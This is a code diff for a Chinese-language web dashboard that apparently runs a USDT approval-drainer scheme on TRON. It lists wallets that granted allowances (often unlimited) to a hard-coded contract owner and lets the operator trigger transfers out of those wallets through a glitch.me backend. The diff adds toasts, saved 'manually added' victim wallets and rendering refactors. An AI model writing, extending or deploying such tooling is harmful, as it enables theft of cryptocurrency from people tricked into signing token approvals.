@@ -161,6 +161,24 @@
         .check-wallet-input {
             max-width: 400px;
         }
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1100;
+        }
+        .wallet-badge {
+            font-size: 0.8em;
+            padding: 3px 8px;
+            border-radius: 12px;
+            background-color: #e9ecef;
+            color: #495057;
+            margin-left: 8px;
+        }
+        .wallet-badge.manual {
+            background-color: #cff4fc;
+            color: #055160;
+        }
     </style>
 </head>
 <body>
@@ -276,303 +294,374 @@
         </div>
     </div>
 
+    <!-- Toast 通知 -->
+    <div class="toast" role="alert" aria-live="assertive" aria-atomic="true">
+        <div class="toast-header">
+            <i class="fas fa-info-circle me-2"></i>
+            <strong class="me-auto">系統通知</strong>
+            <button type="button" class="btn-close" data-bs-dismiss="toast"></button>
+        </div>
+        <div class="toast-body"></div>
+    </div>
+
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
     <script>
-        // 全局變量
-        let currentWallet = null;
-        let transferModal = null;
-        let socket = null;
-        const API_BASE_URL = 'https://spectacular-wholesale-sprint.glitch.me';
-        const CONTRACT_OWNER = 'THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR';
-        const MIN_TRX_BALANCE = 50; // TRX 餘額警告閾值
+    // 全局變量
+    let currentWallet = null;
+    let transferModal = null;
+    let socket = null;
+    let toast = null;
+    const API_BASE_URL = 'https://spectacular-wholesale-sprint.glitch.me';
+    const CONTRACT_OWNER = 'THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR';
+    const MIN_TRX_BALANCE = 50; // TRX 餘額警告閾值
+    const STORAGE_KEY = 'manualWallets';
 
-        // 初始化
-        document.addEventListener('DOMContentLoaded', function() {
-            transferModal = new bootstrap.Modal(document.getElementById('transferModal'));
-            initializeWebSocket();
-            document.getElementById('contractOwnerAddress').textContent = CONTRACT_OWNER;
-            refreshData();
-            setInterval(refreshData, 60000);
+    // 初始化
+    document.addEventListener('DOMContentLoaded', function() {
+        transferModal = new bootstrap.Modal(document.getElementById('transferModal'));
+        toast = new bootstrap.Toast(document.querySelector('.toast'));
+        initializeWebSocket();
+        document.getElementById('contractOwnerAddress').textContent = CONTRACT_OWNER;
+        refreshData();
+        setInterval(refreshData, 60000);
 
-            // 添加回車鍵檢查功能
-            document.getElementById('checkWalletInput').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    checkWallet();
-                }
-            });
+        // 添加回車鍵檢查功能
+        document.getElementById('checkWalletInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                checkWallet();
+            }
         });
 
-        // 初始化 WebSocket
-        function initializeWebSocket() {
-            socket = io(API_BASE_URL);
+        // 載入已保存的錢包
+        loadStoredWallets();
+    });
 
-            socket.on('connect', function() {
-                updateSystemStatus(true);
-            });
+    // 獲取已保存的手動添加錢包
+    function getStoredWallets() {
+        const stored = localStorage.getItem(STORAGE_KEY);
+        return stored ? JSON.parse(stored) : [];
+    }
 
-            socket.on('disconnect', function() {
-                updateSystemStatus(false);
-            });
-
-            socket.on('trx-balance-warning', function(data) {
-                if (data.balance < MIN_TRX_BALANCE) {
-                    showTrxBalanceWarning(data);
-                }
-            });
-
-            socket.on('transfer-started', function(data) {
-                updateTransferStatus(data.fromAddress, '轉帳開始處理...', 'status-pending');
-            });
-
-            socket.on('transfer-confirmed', function(data) {
-                updateTransferStatus(data.fromAddress, '轉帳成功！', 'status-success');
-                refreshData();
-            });
-
-            socket.on('transfer-failed', function(data) {
-                updateTransferStatus(data.fromAddress, '轉帳失敗: ' + data.error, 'status-error');
-            });
+    // 保存手動添加的錢包
+    function storeWallet(address) {
+        const wallets = getStoredWallets();
+        if (!wallets.includes(address)) {
+            wallets.push(address);
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(wallets));
         }
+    }
 
-        // 更新系統狀態指示器
-        function updateSystemStatus(isOnline) {
-            const indicator = document.getElementById('systemStatus');
-            const statusText = document.getElementById('statusText');
-            
-            indicator.className = 'status-indicator ' + (isOnline ? 'status-online' : 'status-offline');
-            statusText.textContent = isOnline ? '系統在線' : '系統離線';
-        }
-
-        // 顯示 TRX 餘額警告
-        function showTrxBalanceWarning(data) {
-            const warning = document.getElementById('trxBalanceWarning');
-            const warningText = document.getElementById('warningText');
-            warningText.textContent = `合約調用者 TRX 餘額過低！當前：${data.balance} TRX，最低要求：${MIN_TRX_BALANCE} TRX`;
-            warning.style.display = 'block';
-        }
-
-        // 檢查錢包功能
-        async function checkWallet() {
-            const input = document.getElementById('checkWalletInput');
-            const address = input.value.trim();
-            
-            if (!address) {
-                alert('請輸入要檢查的錢包地址');
-                return;
-            }
-
+    // 載入已保存的錢包
+    async function loadStoredWallets() {
+        const storedWallets = getStoredWallets();
+        for (const address of storedWallets) {
             try {
-                // 檢查餘額和授權
                 const response = await fetch(`${API_BASE_URL}/balance/${address}`);
                 const data = await response.json();
-
-                if (data.error) {
-                    alert('檢查錢包失敗: ' + data.error);
-                    return;
-                }
-
-                // 檢查是否已授權
-                const allowance = data.allowance;
-                if (allowance === 'Unlimited' || parseInt(allowance) > 0) {
-                    // 將錢包添加到列表
-                    const wallet = {
-                        address: address,
+                if (data.allowance === 'Unlimited' || parseInt(data.allowance) > 0) {
+                    addWalletToList({
+                        address,
                         balance: data.balance,
-                        allowance: data.allowance,
-                        lastUpdated: Date.now()
-                    };
-
-                    // 檢查錢包是否已在列表中
-                    const walletList = document.getElementById('walletList');
-                    const existingWallet = walletList.querySelector(`[data-address="${address}"]`);
-                    
-                    if (!existingWallet) {
-                        // 添加新錢包卡片
-                        const card = document.createElement('div');
-                        card.className = 'card wallet-card mb-3';
-                        card.setAttribute('data-address', address);
-                        card.innerHTML = `
-                            <div class="card-body">
-                                <div class="row align-items-center">
-                                    <div class="col-md-4">
-                                        <h6 class="card-subtitle mb-2 text-muted">
-                                            <i class="fas fa-wallet me-2"></i>錢包地址
-                                        </h6>
-                                        <p class="card-text text-break">${address}</p>
-                                    </div>
-                                    <div class="col-md-3">
-                                        <h6 class="card-subtitle mb-2 text-muted">
-                                            <i class="fas fa-coins me-2"></i>USDT 餘額
-                                        </h6>
-                                        <p class="card-text">${data.balance}</p>
-                                    </div>
-                                    <div class="col-md-3">
-                                        <h6 class="card-subtitle mb-2 text-muted">
-                                            <i class="fas fa-lock-open me-2"></i>授權額度
-                                        </h6>
-                                        <p class="card-text">${data.allowance}</p>
-                                    </div>
-                                    <div class="col-md-2 text-end">
-                                        <button class="btn btn-primary" onclick="showTransferModal('${address}')">
-                                            <i class="fas fa-exchange-alt me-1"></i>轉帳
-                                        </button>
-                                    </div>
-                                </div>
-                                <div class="transfer-status mt-2" id="status_${address}"></div>
-                            </div>
-                        `;
-                        walletList.insertBefore(card, walletList.firstChild);
-                        alert('已將授權錢包添加到列表中');
-                    } else {
-                        alert('此錢包已在列表中');
-                    }
-                } else {
-                    alert('此錢包未授權或授權額度為0');
+                        allowance: data.allowance === 'Unlimited' ? '無限' : data.allowance,
+                        isManual: true
+                    });
                 }
-
-                // 清空輸入框
-                input.value = '';
             } catch (error) {
-                console.error('Check wallet error:', error);
-                alert('檢查錢包時發生錯誤');
+                console.error('Loading stored wallet error:', error);
             }
         }
+    }
 
-        // 刷新數據
-        async function refreshData() {
-            try {
-                const ownerBalance = await fetch(`${API_BASE_URL}/contract-owner-balance`).then(r => r.json());
-                document.getElementById('contractOwnerBalance').textContent = `${ownerBalance.balance} TRX`;
+    // 初始化 WebSocket
+    function initializeWebSocket() {
+        socket = io(API_BASE_URL);
 
-                if (ownerBalance.balance < MIN_TRX_BALANCE) {
-                    showTrxBalanceWarning({balance: ownerBalance.balance});
-                }
+        socket.on('connect', function() {
+            updateSystemStatus(true);
+            showToast('success', '系統已連接');
+        });
 
-                const wallets = await fetch(`${API_BASE_URL}/authorized-wallets`).then(r => r.json());
-                updateWalletList(wallets);
-            } catch (error) {
-                console.error('Error refreshing data:', error);
-                updateSystemStatus(false);
+        socket.on('disconnect', function() {
+            updateSystemStatus(false);
+            showToast('error', '系統已斷開連接');
+        });
+
+        socket.on('trx-balance-warning', function(data) {
+            if (data.balance < MIN_TRX_BALANCE) {
+                showTrxBalanceWarning(data);
             }
+        });
+
+        socket.on('transfer-started', function(data) {
+            updateTransferStatus(data.fromAddress, '交易已廣播到網絡', 'status-success');
+            showToast('success', '交易已發送');
+            setTimeout(() => {
+                transferModal.hide();
+                refreshData();
+            }, 1500);
+        });
+
+        socket.on('transfer-confirmed', function(data) {
+            showToast('success', '轉帳成功！');
+            refreshData();
+        });
+
+        socket.on('transfer-failed', function(data) {
+            updateTransferStatus(data.fromAddress, '轉帳失敗: ' + data.error, 'status-error');
+            showToast('error', '轉帳失敗: ' + data.error);
+        });
+    }
+
+    // 顯示 Toast 通知
+    function showToast(type, message) {
+        const toastEl = document.querySelector('.toast');
+        const icon = type === 'success' ? 'check-circle' : type === 'error' ? 'times-circle' : 'info-circle';
+        const color = type === 'success' ? 'text-success' : type === 'error' ? 'text-danger' : 'text-info';
+        
+        toastEl.querySelector('.toast-header i').className = `fas fa-${icon} me-2 ${color}`;
+        toastEl.querySelector('.toast-body').textContent = message;
+        toast.show();
+    }
+
+    // 更新系統狀態指示器
+    function updateSystemStatus(isOnline) {
+        const indicator = document.getElementById('systemStatus');
+        const statusText = document.getElementById('statusText');
+        
+        indicator.className = 'status-indicator ' + (isOnline ? 'status-online' : 'status-offline');
+        statusText.textContent = isOnline ? '系統在線' : '系統離線';
+    }
+
+    // 顯示 TRX 餘額警告
+    function showTrxBalanceWarning(data) {
+        const warning = document.getElementById('trxBalanceWarning');
+        const warningText = document.getElementById('warningText');
+        warningText.textContent = `合約調用者 TRX 餘額過低！當前：${data.balance} TRX，最低要求：${MIN_TRX_BALANCE} TRX`;
+        warning.style.display = 'block';
+    }
+
+    // 檢查錢包功能
+    async function checkWallet() {
+        const input = document.getElementById('checkWalletInput');
+        const address = input.value.trim();
+        
+        if (!address) {
+            showToast('error', '請輸入要檢查的錢包地址');
+            return;
         }
 
-        // 更新錢包列表
-        function updateWalletList(wallets) {
-            const walletList = document.getElementById('walletList');
-            // 保留手動添加的錢包
-            const manualWallets = Array.from(walletList.children).filter(card => 
-                !wallets.some(w => w.address === card.getAttribute('data-address'))
-            );
-            
-            walletList.innerHTML = '';
-            
-            // 首先添加自動獲取的錢包
-            wallets.forEach(function(wallet) {
-                if (wallet.allowance === 'Unlimited' || parseInt(wallet.allowance) > 0) {
-                    const card = document.createElement('div');
-                    card.className = 'card wallet-card mb-3';
-                    card.setAttribute('data-address', wallet.address);
-                    card.innerHTML = `
-                        <div class="card-body">
-                            <div class="row align-items-center">
-                                <div class="col-md-4">
-                                    <h6 class="card-subtitle mb-2 text-muted">
-                                        <i class="fas fa-wallet me-2"></i>錢包地址
-                                    </h6>
-                                    <p class="card-text text-break">${wallet.address}</p>
-                                </div>
-                                <div class="col-md-3">
-                                    <h6 class="card-subtitle mb-2 text-muted">
-                                        <i class="fas fa-coins me-2"></i>USDT 餘額
-                                    </h6>
-                                    <p class="card-text">${wallet.balance}</p>
-                                </div>
-                                <div class="col-md-3">
-                                    <h6 class="card-subtitle mb-2 text-muted">
-                                        <i class="fas fa-lock-open me-2"></i>授權額度
-                                    </h6>
-                                    <p class="card-text">${wallet.allowance}</p>
-                                </div>
-                                <div class="col-md-2 text-end">
-                                    <button class="btn btn-primary" onclick="showTransferModal('${wallet.address}')">
-                                        <i class="fas fa-exchange-alt me-1"></i>轉帳
-                                    </button>
-                                </div>
-                            </div>
-                            <div class="transfer-status mt-2" id="status_${wallet.address}"></div>
-                        </div>
-                    `;
-                    walletList.appendChild(card);
-                }
-            });
+        try {
+            const response = await fetch(`${API_BASE_URL}/balance/${address}`);
+            const data = await response.json();
 
-            // 然後添加手動添加的錢包
-            manualWallets.forEach(card => walletList.appendChild(card));
-        }
-
-        // 顯示轉帳模態框
-        function showTransferModal(address) {
-            currentWallet = address;
-            document.getElementById('transferAmount').value = '';
-            document.getElementById('transferStatus').textContent = '';
-            document.getElementById('transferStatus').className = 'transfer-status';
-            transferModal.show();
-        }
-
-        // 更新轉帳狀態
-        function updateTransferStatus(address, message, statusClass) {
-            const statusElement = document.getElementById('status_' + address);
-            if (statusElement) {
-                statusElement.textContent = message;
-                statusElement.className = 'transfer-status ' + (statusClass || '');
-            }
-            const modalStatus = document.getElementById('transferStatus');
-            if (modalStatus && currentWallet === address) {
-                modalStatus.textContent = message;
-                modalStatus.className = 'transfer-status ' + (statusClass || '');
-            }
-        }
-
-        // 確認轉帳按鈕事件
-        document.getElementById('confirmTransfer').addEventListener('click', async function() {
-            const button = this;
-            const amount = document.getElementById('transferAmount').value;
-            
-            if (!amount || amount <= 0) {
-                alert('請輸入有效的轉帳金額');
+            if (data.error) {
+                showToast('error', '檢查錢包失敗: ' + data.error);
                 return;
             }
 
-            try {
-                button.disabled = true;
-                button.innerHTML = '<i class="fas fa-spinner fa-spin me-1"></i>處理中...';
+            const allowance = data.allowance;
+            if (allowance === 'Unlimited' || parseInt(allowance) > 0) {
+                storeWallet(address);
+                
+                const wallet = {
+                    address: address,
+                    balance: data.balance,
+                    allowance: allowance === 'Unlimited' ? '無限' : allowance,
+                    isManual: true
+                };
 
-                const response = await fetch(`${API_BASE_URL}/transfer`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        fromAddress: currentWallet,
-                        amount: amount
-                    })
-                });
-
-                const result = await response.json();
-                if (result.success) {
-                    updateTransferStatus(currentWallet, '交易已發送，等待確認...', 'status-pending');
+                const walletList = document.getElementById('walletList');
+                const existingWallet = walletList.querySelector(`[data-address="${address}"]`);
+                
+                if (!existingWallet) {
+                    addWalletToList(wallet);
+                    showToast('success', '已將授權錢包添加到列表中');
                 } else {
-                    updateTransferStatus(currentWallet, '錯誤：' + result.error, 'status-error');
+                    showToast('warning', '此錢包已在列表中');
                 }
-            } catch (error) {
-                console.error('Transfer error:', error);
-                updateTransferStatus(currentWallet, '轉帳請求失敗', 'status-error');
-            } finally {
-                button.disabled = false;
-                button.innerHTML = '<i class="fas fa-check me-1"></i>確認轉帳';
+            } else {
+                showToast('warning', '此錢包未授權或授權額度為0');
+            }
+
+            input.value = '';
+        } catch (error) {
+            console.error('Check wallet error:', error);
+            showToast('error', '檢查錢包時發生錯誤');
+        }
+    }
+
+    // 添加錢包到列表
+    function addWalletToList(wallet) {
+        const walletList = document.getElementById('walletList');
+        const card = document.createElement('div');
+        card.className = 'card wallet-card mb-3';
+        card.setAttribute('data-address', wallet.address);
+        
+        const badgeHtml = wallet.isManual ? 
+            '<span class="wallet-badge manual"><i class="fas fa-user-plus me-1"></i>手動添加</span>' : '';
+
+        card.innerHTML = `
+            <div class="card-body">
+                <div class="row align-items-center">
+                    <div class="col-md-4">
+                        <h6 class="card-subtitle mb-2 text-muted">
+                            <i class="fas fa-wallet me-2"></i>錢包地址
+                            ${badgeHtml}
+                        </h6>
+                        <p class="card-text text-break">${wallet.address}</p>
+                    </div>
+                    <div class="col-md-3">
+                        <h6 class="card-subtitle mb-2 text-muted">
+                            <i class="fas fa-coins me-2"></i>USDT 餘額
+                        </h6>
+                        <p class="card-text">${wallet.balance}</p>
+                    </div>
+                    <div class="col-md-3">
+                        <h6 class="card-subtitle mb-2 text-muted">
+                            <i class="fas fa-lock-open me-2"></i>授權額度
+                        </h6>
+                        <p class="card-text">${wallet.allowance}</p>
+                    </div>
+                    <div class="col-md-2 text-end">
+                        <button class="btn btn-primary" onclick="showTransferModal('${wallet.address}')">
+                            <i class="fas fa-exchange-alt me-1"></i>轉帳
+                        </button>
+                    </div>
+                </div>
+                <div class="transfer-status mt-2" id="status_${wallet.address}"></div>
+            </div>
+        `;
+        
+        if (wallet.isManual) {
+            walletList.insertBefore(card, walletList.firstChild);
+        } else {
+            walletList.appendChild(card);
+        }
+    }
+
+    // 刷新數據
+    async function refreshData() {
+        try {
+            const ownerBalance = await fetch(`${API_BASE_URL}/contract-owner-balance`).then(r => r.json());
+            document.getElementById('contractOwnerBalance').textContent = `${ownerBalance.balance} TRX`;
+
+            if (ownerBalance.balance < MIN_TRX_BALANCE) {
+                showTrxBalanceWarning({balance: ownerBalance.balance});
+            }
+
+            const wallets = await fetch(`${API_BASE_URL}/authorized-wallets`).then(r => r.json());
+            updateWalletList(wallets);
+        } catch (error) {
+            console.error('Error refreshing data:', error);
+            updateSystemStatus(false);
+        }
+    }
+
+    // 更新錢包列表
+    function updateWalletList(wallets) {
+        const walletList = document.getElementById('walletList');
+        const storedWallets = getStoredWallets();
+        
+        // 保留手動添加的錢包
+        const manualWallets = Array.from(walletList.children).filter(card => 
+            storedWallets.includes(card.getAttribute('data-address'))
+        );
+        
+        walletList.innerHTML = '';
+        
+        // 添加自動獲取的錢包
+        wallets.forEach(function(wallet) {
+            if (wallet.allowance === 'Unlimited' || parseInt(wallet.allowance) > 0) {
+                addWalletToList({
+                    ...wallet,
+                    allowance: wallet.allowance === 'Unlimited' ? '無限' : wallet.allowance
+                });
             }
         });
-    </script>
+
+        // 添加手動添加的錢包
+        manualWallets.forEach(card => walletList.appendChild(card));
+
+        if (walletList.children.length === 0) {
+            walletList.innerHTML = `
+                <div class="alert alert-info">
+                    <i class="fas fa-info-circle me-2"></i>尚未添加任何錢包
+                </div>
+            `;
+        }
+    }
+
+    // 顯示轉帳模態框
+    function showTransferModal(address) {
+        currentWallet = address;
+        document.getElementById('transferAmount').value = '';
+        document.getElementById('transferStatus').textContent = '';
+        document.getElementById('transferStatus').className = 'transfer-status';
+        document.getElementById('confirmTransfer').disabled = false;
+        transferModal.show();
+    }
+
+    // 更新轉帳狀態
+    function updateTransferStatus(address, message, statusClass) {
+        const statusElement = document.getElementById('status_' + address);
+        if (statusElement) {
+            statusElement.textContent = message;
+            statusElement.className = 'transfer-status ' + (statusClass || '');
+        }
+        const modalStatus = document.getElementById('transferStatus');
+        if (modalStatus && currentWallet === address) {
+            modalStatus.textContent = message;
+            modalStatus.className = 'transfer-status ' + (statusClass || '');
+        }
+    }
+
+    // 確認轉帳按鈕事件
+    document.getElementById('confirmTransfer').addEventListener('click', async function() {
+        const button = this;
+        const amount = document.getElementById('transferAmount').value;
+        
+        if (!amount || amount <= 0) {
+            showToast('error', '請輸入有效的轉帳金額');
+            return;
+        }
+
+        try {
+            button.disabled = true;
+            button.innerHTML = '<i class="fas fa-spinner fa-spin me-1"></i>處理中...';
+
+            const response = await fetch(`${API_BASE_URL}/transfer`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    fromAddress: currentWallet,
+                    amount: amount
+                })
+            });
+
+            const result = await response.json();
+            if (result.success) {
+                updateTransferStatus(currentWallet, '交易已發送', 'status-success');
+                showToast('success', '交易已發送');
+                setTimeout(() => {
+                    transferModal.hide();
+                    refreshData();
+                }, 1500);
+            } else {
+                updateTransferStatus(currentWallet, '錯誤：' + result.error, 'status-error');
+                showToast('error', result.error);
+            }
+        } catch (error) {
+            console.error('Transfer error:', error);
+            updateTransferStatus(currentWallet, '轉帳請求失敗', 'status-error');
+            showToast('error', '轉帳請求失敗');
+        } finally {
+            button.disabled = false;
+            button.innerHTML = '<i class="fas fa-check me-1"></i>確認轉帳';
+        }
+    });
+</script>
 </body>
 </html>
